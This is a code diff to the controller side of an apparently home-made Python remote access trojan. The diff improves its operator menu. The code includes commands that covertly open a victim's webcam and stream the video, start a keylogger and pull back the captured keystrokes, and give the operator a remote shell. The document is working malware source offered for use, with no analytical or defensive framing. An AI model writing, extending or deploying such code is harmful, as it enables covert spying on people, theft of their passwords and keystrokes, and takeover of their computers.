@@ -5,9 +5,10 @@ import numpy
 import cv2
 import struct
 import pickle
+import os
+import platform
 
 # -- GLOBAL VARIABLES -- 
-HEADER = 64
 PORT = 8080
 SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
@@ -15,19 +16,11 @@ ADDR = (SERVER, PORT)
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 
-'''
-def handle_client(conn, addr):
-    print(f"[NEW CONNECTION] -- {addr} has conected")
-
-    connected = True
-    while connected:
-        msg = conn.recv()
-'''
-
 def webCam(conn, command, addr):
     conn.send(command)
     data = b''
     payload_size = struct.calcsize("L") 
+    print('\n[+] Webcam is running on client\'s machine\n')
     while True:
         while len(data) < payload_size:
             data += conn.recv(4096)
@@ -44,8 +37,10 @@ def webCam(conn, command, addr):
         ###
 
         frame=pickle.loads(frame_data)
-        cv2.imshow('frame',frame)
+        cv2.imshow(f'Client\'s webcam {addr[0]}:{addr[1]}',frame)
         if cv2.waitKey(5) == 27:
+            print('[-] Webcam is terminated')
+            time.sleep(1.5)
             break 
     cv2.destroyAllWindows()
 
@@ -58,9 +53,9 @@ def transfer(conn,command):
     while True:  
         bits = conn.recv(1024)
         if bits.endswith(b'DONE'):
-            print('[+] Transferring KeyLog File...')
             time.sleep(2)
-            print('\n[+] Transfer completed ')
+            print('[-] Keylogger terminated completed')
+            print('[+] Keylogger file received')
             f.close()
             break
         f.write(bits)
@@ -68,35 +63,73 @@ def transfer(conn,command):
 def get_shell(conn, command):
    conn.send(command) 
    while True:
-        cmd = input(" CMD > ").encode()
+        cmd = input("\n[CMD] > ").encode()
+        conn.send(cmd)
         
         if b'close' in cmd:
             break
-        conn.send(cmd)
-        stdout = conn.recv(1024*1024)
 
+        stdout = conn.recv(1024*1024)
         print(stdout.decode())
 
 def start():
+    isLoggerActive = False
     server.listen()
+    print("[STARTING] -- Server is starting ... ")
     print(f"[LISTENING] -- Server is listeing on {SERVER}")
-    while True:
-        conn, addr = server.accept()
-        
-        while True:
-            command = input(" >> ").encode()
-            print(command, type(command))
-            if b'open_webcam' in command:
-                webCam(conn, command, addr)
-            elif b'logger_start' in command:
-                conn.send(command)
-            elif b'logger_end' in command:
-                transfer(conn, command)
-            elif b'get_shell' in command:
-                get_shell(conn, command)
-            else:
-                break
-        
+    conn, addr = server.accept()
+    
+    # clears the screen
+    if platform.system() in ['Linux', 'Darwin']:
+        os.system('clear')
+    else:
+        os.system("cls")
 
-print("[STARTING] -- Server is starting ... ")
+    while True:
+        print(f"[CLIENT CONNECTED] -- {addr[0]} is connected on port {addr[1]}")
+        print('''
+             ╔╦╦═╗     ╔╗      ╔╗     (`-()_.-=-.
+            ╔╝╠╣═╣╔═╦╦╦╣╚╗╔╦╦═╗║╚╗    /00  ,  ,  \      |
+            ║╬║╠═║║║║║║║║║║╔╣╬╚╣╔╣  =(o_/=//_(   /====='
+            ╚═╩╩═╝╚╩═╩═╩╩╝╚╝╚══╩═╝      ~"` ~"~~` 
+            
+                        -- COMMANDS --
+            open_webcam  -- active client\'s webcam
+            logger_start -- start keylogger
+            logger_end   -- stop keylogger and recieved keyslog
+            get_shell    -- get access to command line 
+            terminate    -- terminate trojan 
+        ''')
+        
+        if isLoggerActive:
+            print('[+] Keylogger is running on client\'s machine\n')
+        
+        command = input("[COMMAND] >> ").encode()
+
+        if b'open_webcam' in command:
+            webCam(conn, command, addr)
+        elif b'logger_start' in command:
+            conn.send(command)
+            isLoggerActive = True
+        elif b'logger_end' in command:
+            transfer(conn, command)
+            isLoggerActive = False
+        elif b'get_shell' in command:
+            get_shell(conn, command)
+        elif b'terminate' in command:
+            conn.send(command)
+            break
+
+        if isLoggerActive:
+            print('[+] Keylogger is running on client\'s machine')
+
+        # clears the screen
+        if platform.system() in ['Linux', 'Darwin']:
+            os.system('clear')
+        else:
+            os.system("cls")
+    
+    print('[+] Terminating dis nuh rat trojan')
+    conn.close()
+
 start()
